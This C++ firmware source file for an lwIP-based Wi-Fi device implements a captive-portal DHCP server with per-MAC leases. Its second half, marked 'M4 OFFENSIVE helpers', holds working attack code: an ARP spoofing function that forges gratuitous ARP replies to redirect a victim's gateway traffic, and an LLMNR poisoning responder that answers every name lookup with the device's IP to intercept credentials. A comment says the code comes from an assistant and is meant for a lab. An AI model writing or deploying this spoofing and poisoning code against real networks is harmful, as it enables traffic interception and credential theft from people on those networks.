#include "dhcp_captive.h"
#include "lwip_log.h"
extern volatile unsigned g_dhcp_stage;
#include "dhcp_build.h"
#include "lwip_log.h"
#include "lwip_call.h"
#include <lwip/udp.h>
#include <lwip/pbuf.h>
#include <lwip/ip_addr.h>
#include <lwip/ip.h>
#include <lwip/netif.h>
#include <stdio.h>

#define DHCP_SRV_PORT 67
#define DHCP_CLI_PORT 68

// AmebaD WLAN interfaces: xnetif[0]=STA, xnetif[1]=SoftAP (concurrent mode).
extern "C" struct netif xnetif[];

static struct udp_pcb *dhcp_pcb = NULL;

// Lease table. The old allocation was "100 + chaddr[5] % 101", so two clients whose MACs share a
// last byte (or differ by 101) got the same address - and the portal authorizes per IP, so they
// also shared authorization. Hosts are now handed out uniquely and remembered per MAC.
#define LEASE_MAX 8
struct lease { uint8_t mac[6]; uint8_t host; };
static struct lease leases[LEASE_MAX];
static uint8_t lease_n = 0;

static uint8_t lease_host_for(const uint8_t* mac) {
    for (uint8_t i = 0; i < lease_n; i++)
        if (memcmp(leases[i].mac, mac, 6) == 0) return leases[i].host;
    if (lease_n >= LEASE_MAX) {   // evict the oldest rather than fall back to a colliding hash
        memmove(&leases[0], &leases[1], sizeof(leases[0]) * (LEASE_MAX - 1));
        lease_n = LEASE_MAX - 1;
    }
    uint8_t host = 100;
    for (;;) {   // 101 hosts, at most LEASE_MAX-1 used: always terminates
        bool used = false;
        for (uint8_t i = 0; i < lease_n; i++) if (leases[i].host == host) { used = true; break; }
        if (!used) break;
        if (++host > 200) host = 100;
    }
    memcpy(leases[lease_n].mac, mac, 6);
    leases[lease_n].host = host;
    lease_n++;
    return host;
}

// Cheap pre-check so a junk packet does not consume a lease: length, magic cookie and message type.
static bool dhcp_answerable(const uint8_t* req, uint16_t len) {
    if (len < DHCP_FIXED_LEN + 4) return false;
    if (memcmp(req + DHCP_FIXED_LEN, DHCP_MAGIC, 4) != 0) return false;
    uint8_t ml = 0;
    const uint8_t* mt = dhcp_find_opt(req, len, 53, &ml);
    return mt && ml >= 1 && (mt[0] == 1 || mt[0] == 3);
}
static struct netif *ap_netif = NULL;
static int ap_ifindex = 0;   // which xnetif[] carries the AP - set by start_DHCP_Server()
// Option-114 captive-portal URL (set by the sketch at AP start; host-based, not the IP).
static char dhcp_cp_uri[96] = "http://192.168.4.1/cp.json";

// Move the SoftAP netif off the SDK default (192.168.1.1) onto our captive subnet.
//
// Which netif? The core's apActivate() chooses it from arduino_wifi_mode_check:
//   0x11 (STA_AP) -> WLAN1 / xnetif[1];  anything else -> WLAN0 / xnetif[0].
// createAP() forces 0x10 for a pure softAP, so the AP is xnetif[0]. Use that same rule (passed
// in as ap_if) instead of the old "find whichever netif holds 192.168.1.1" search: if the SDK's
// default AP IP ever differs, that search matches nothing and the fallback (xnetif[1]) is the
// WRONG interface in pure AP mode - every DHCP offer would then leave through a dead netif and
// no client would ever get a lease.
static void retarget_ap_netif(void) {
    ip4_addr_t nip, nmask, ngw;
    IP4_ADDR(&nip,  DHCP_AP_IP[0], DHCP_AP_IP[1], DHCP_AP_IP[2], DHCP_AP_IP[3]);
    IP4_ADDR(&nmask, DHCP_AP_MASK[0], DHCP_AP_MASK[1], DHCP_AP_MASK[2], DHCP_AP_MASK[3]);
    IP4_ADDR(&ngw,  DHCP_AP_IP[0], DHCP_AP_IP[1], DHCP_AP_IP[2], DHCP_AP_IP[3]);
    netif_set_addr(&xnetif[ap_ifindex], &nip, &nmask, &ngw);
    {   // runs in tcpip now: defer the UART write
        char lb[80];
        snprintf(lb, sizeof(lb), "DHCP: retargeted netif %d -> %d.%d.%d.%d", ap_ifindex,
                 DHCP_AP_IP[0], DHCP_AP_IP[1], DHCP_AP_IP[2], DHCP_AP_IP[3]);
        lwip_log(lb);
    }
}

// The AP netif, by the same interface rule apActivate() used.
static struct netif *find_ap_netif(void) {
    return &xnetif[ap_ifindex];
}

// Same lwip raw-UDP callback shape petrel uses for DNS (cast on udp_recv below).
static void dhcp_recv_cb(void *arg, struct udp_pcb *pcb, struct pbuf *p,
                         struct ip_addr *addr, uint16_t port) {
    (void)arg; (void)addr; (void)port;
    if (p == NULL) return;

    static uint8_t reqbuf[600];
    static uint8_t repbuf[600];
    uint16_t rlen = (p->tot_len < sizeof(reqbuf)) ? p->tot_len : (uint16_t)sizeof(reqbuf);
    pbuf_copy_partial(p, reqbuf, rlen, 0);
    pbuf_free(p);

    if (!dhcp_answerable(reqbuf, rlen)) return;
    size_t n = dhcp_build_reply(repbuf, sizeof(repbuf), reqbuf, rlen, dhcp_cp_uri,
                                lease_host_for(reqbuf + 28));
    if (n == 0) return;  // not a DISCOVER/REQUEST we answer

    g_dhcp_stage = 30; lwip_log("H30");
    struct pbuf *op = pbuf_alloc(PBUF_TRANSPORT, (u16_t)n, PBUF_RAM);
    if (op == NULL) return;
    pbuf_take(op, repbuf, (u16_t)n);
    // Client has no IP yet -> broadcast the OFFER/ACK OUT THE AP NETIF (plain udp_sendto
    // has no route for 255.255.255.255 and silently drops it).
    ip_addr_t bcast;
    IP_ADDR4(&bcast, 255, 255, 255, 255);
    g_dhcp_stage = 31; lwip_log("H31");
    err_t e = udp_sendto_if(pcb, op, &bcast, DHCP_CLI_PORT, ap_netif ? ap_netif : find_ap_netif());
    g_dhcp_stage = 32; lwip_log("H32");
    {   // tcpip thread: defer the UART write to loop() (a blocking write here stalls the stack)
        char lb[80];
        snprintf(lb, sizeof(lb), "DHCP: reply type=%d len=%d send=%d",
                 repbuf[DHCP_FIXED_LEN + 6], (int)n, (int)e);
        lwip_log(lb);
    }
    pbuf_free(op);
    g_dhcp_stage = 33; lwip_log("H33");
}

struct dhcp_start_args { const char* uri; int ap_if; bool ok; };

static void start_DHCP_Server_impl(void* ctx) {
    struct dhcp_start_args* a = (struct dhcp_start_args*)ctx;
    const char* cp_uri = a->uri;
    int ap_if = a->ap_if;
    a->ok = false;
    if (cp_uri && cp_uri[0]) {                 // remember the portal URL for option 114
        strncpy(dhcp_cp_uri, cp_uri, sizeof(dhcp_cp_uri) - 1);
        dhcp_cp_uri[sizeof(dhcp_cp_uri) - 1] = 0;
    }
    if (dhcp_pcb != NULL) { a->ok = true; return; }
    ap_ifindex = (ap_if == 1) ? 1 : 0;    // same rule apActivate() used to pick WLAN0/WLAN1
    retarget_ap_netif();          // move SoftAP from 192.168.1.1 to our captive subnet
    ap_netif = find_ap_netif();
    dhcp_pcb = udp_new();
    if (dhcp_pcb == NULL) return;
    dhcp_pcb->so_options |= SOF_BROADCAST;
    err_t e = udp_bind(dhcp_pcb, IP4_ADDR_ANY, DHCP_SRV_PORT);
    if (e != ERR_OK) {
        udp_remove(dhcp_pcb);
        dhcp_pcb = NULL;
        return;
    }
    udp_recv(dhcp_pcb, (udp_recv_fn)dhcp_recv_cb, NULL);
    {
        char lb[96];
        snprintf(lb, sizeof(lb), "DHCP: server up on :67 (bind=%d, opt114=%s)", (int)e, dhcp_cp_uri);
        lwip_log(lb);
    }
    a->ok = true;
}

// The raw udp_* calls must run in the tcpip thread (LWIP_TCPIP_CORE_LOCKING=0).
bool start_DHCP_Server(const char *cp_uri, int ap_if) {
    struct dhcp_start_args a = { cp_uri, ap_if, false };
    lwip_call(start_DHCP_Server_impl, &a);
    return a.ok;
}

static void stop_DHCP_Server_impl(void* ctx) {
    (void)ctx;
    lease_n = 0;   // leases belong to one AP session
    if (dhcp_pcb != NULL) {
        udp_remove(dhcp_pcb);
        dhcp_pcb = NULL;
    }
}

void stop_DHCP_Server() { lwip_call(stop_DHCP_Server_impl, NULL); }

// ============================================================================
// M4 OFFENSIVE helpers (owner-only, LIVE in an RF-isolated lab; UNVERIFIED by the
// assistant — raw-frame / protocol correctness needs validation on your network).
// Reuse this file's lwIP includes + xnetif[] (xnetif[0] = station after WiFi.begin).
// ============================================================================

// ARP spoof: gratuitous ARP reply broadcasting "<sender_ip> is-at <our MAC>" so the victim's ARP
// cache points <sender_ip> (usually the gateway) at us. Call repeatedly while station-joined.
// pbuf_alloc/linkoutput are raw lwIP, so the whole operation runs in the tcpip thread.
struct arp_args { const uint8_t* sender; const uint8_t* target; };

static void arp_spoof_once_impl(void* ctx) {
    const struct arp_args* a = (const struct arp_args*)ctx;
    const uint8_t* sender_ip = a->sender;
    const uint8_t* target_ip = a->target;
    struct netif* nif = &xnetif[0];
    struct pbuf* p = pbuf_alloc(PBUF_RAW, 42, PBUF_RAM);
    if (!p) return;
    uint8_t* b = (uint8_t*)p->payload;
    memset(b, 0xFF, 6);                 // eth dst = broadcast
    memcpy(b + 6, nif->hwaddr, 6);      // eth src = our MAC
    b[12] = 0x08; b[13] = 0x06;         // ethertype = ARP
    b[14] = 0x00; b[15] = 0x01;         // htype = ethernet
    b[16] = 0x08; b[17] = 0x00;         // ptype = IPv4
    b[18] = 6; b[19] = 4;               // hlen, plen
    b[20] = 0x00; b[21] = 0x02;         // op = reply
    memcpy(b + 22, nif->hwaddr, 6);     // sender MAC = our MAC
    memcpy(b + 28, sender_ip, 4);       // sender IP = the IP we claim
    memset(b + 32, 0xFF, 6);            // target MAC = broadcast
    memcpy(b + 38, target_ip, 4);       // target IP = victim
    if (nif->linkoutput) nif->linkoutput(nif, p);
    pbuf_free(p);
}

void arp_spoof_once(const uint8_t sender_ip[4], const uint8_t target_ip[4]) {
    struct arp_args a = { sender_ip, target_ip };
    lwip_call(arp_spoof_once_impl, &a);
}

// LLMNR responder: answers any LLMNR query (UDP 5355) with OUR IP, so the victim resolves the asked
// name to us (classic credential-interception setup). Minimal: echoes the question + one A answer.
static struct udp_pcb* llmnr_pcb = NULL;
static void llmnr_cb(void* arg, struct udp_pcb* pcb, struct pbuf* p,
                     const ip_addr_t* addr, u16_t port) {
    (void)arg;
    if (!p) return;
    // Validate instead of echoing whatever arrived: the old code answered responses too (two
    // responders ping-pong) and any trailing bytes were copied into the reply.
    const uint8_t* q = (const uint8_t*)p->payload;
    const uint16_t plen = p->len;
    uint16_t qend = 0;
    bool ok = plen >= 12 && plen < 400 &&
              (q[2] & 0x80) == 0 &&                       // QR: query only
              q[4] == 0x00 && q[5] == 0x01 &&             // QDCOUNT == 1
              q[6] == 0x00 && q[7] == 0x00;               // ANCOUNT == 0
    if (ok) {                                             // find the QNAME terminator
        uint16_t i = 12;
        while (i < plen && q[i] != 0) {
            if (q[i] > 63 || i + 1 + q[i] > plen) { ok = false; break; }
            i = (uint16_t)(i + 1 + q[i]);
        }
        if (ok && i + 5 <= plen && q[i] == 0) qend = (uint16_t)(i + 1);
        else ok = false;
    }
    if (ok) {
        // QTYPE must be A (1) and QCLASS IN (1); the question is 4 bytes after the terminator.
        if (!(q[qend] == 0x00 && q[qend + 1] == 0x01 &&
              q[qend + 2] == 0x00 && q[qend + 3] == 0x01)) ok = false;
    }
    if (ok) {
        const uint16_t qlen = (uint16_t)(qend + 4);        // question only, no trailing junk
        struct pbuf* r = pbuf_alloc(PBUF_TRANSPORT, (u16_t)(qlen + 16), PBUF_RAM);
        if (r) {
            uint8_t* o = (uint8_t*)r->payload;
            memcpy(o, q, qlen);
            o[2] |= 0x80;               // QR = response
            o[6] = 0x00; o[7] = 0x01;   // ANCOUNT = 1
            // The authority/additional sections are not copied, so their counts must be zeroed or
            // the response claims sections that are not there.
            o[8] = 0; o[9] = 0; o[10] = 0; o[11] = 0;
            int n = (int)qlen;
            o[n++] = 0xC0; o[n++] = 0x0C;               // name = ptr to the question
            o[n++] = 0x00; o[n++] = 0x01;               // type A
            o[n++] = 0x00; o[n++] = 0x01;               // class IN
            o[n++] = 0x00; o[n++] = 0x00; o[n++] = 0x00; o[n++] = 0x1E; // TTL 30
            o[n++] = 0x00; o[n++] = 0x04;               // rdlen 4
            uint32_t ip = netif_ip4_addr(&xnetif[0])->addr;       // our station IP (network order)
            memcpy(o + n, &ip, 4); n += 4;
            r->len = r->tot_len = (u16_t)n;
            udp_sendto(pcb, r, addr, port);
            pbuf_free(r);
        }
    }
    pbuf_free(p);
}
static void responder_start_impl(void* ctx) {
    bool* ok = (bool*)ctx;
    *ok = false;
    if (llmnr_pcb) { *ok = true; return; }
    llmnr_pcb = udp_new();
    if (!llmnr_pcb) return;
    if (udp_bind(llmnr_pcb, IP4_ADDR_ANY, 5355) != ERR_OK) { udp_remove(llmnr_pcb); llmnr_pcb = NULL; return; }
    udp_recv(llmnr_pcb, (udp_recv_fn)llmnr_cb, NULL);
    *ok = true;
}

bool responder_start() { bool ok = false; lwip_call(responder_start_impl, &ok); return ok; }

static void responder_stop_impl(void* ctx) { (void)ctx; if (llmnr_pcb) { udp_remove(llmnr_pcb); llmnr_pcb = NULL; } }

void responder_stop() { lwip_call(responder_stop_impl, NULL); }

// unbind_all_udp() frees every pcb; the saved pointers must not dangle afterwards.
void dhcp_forget_pcbs() { dhcp_pcb = NULL; llmnr_pcb = NULL; }

volatile unsigned g_dhcp_stage = 0;

// 2026-10-28: DNS replies must leave through the same netif the DHCP replies use.
int dhcp_captive_ap_ifindex(void) { return ap_ifindex; }
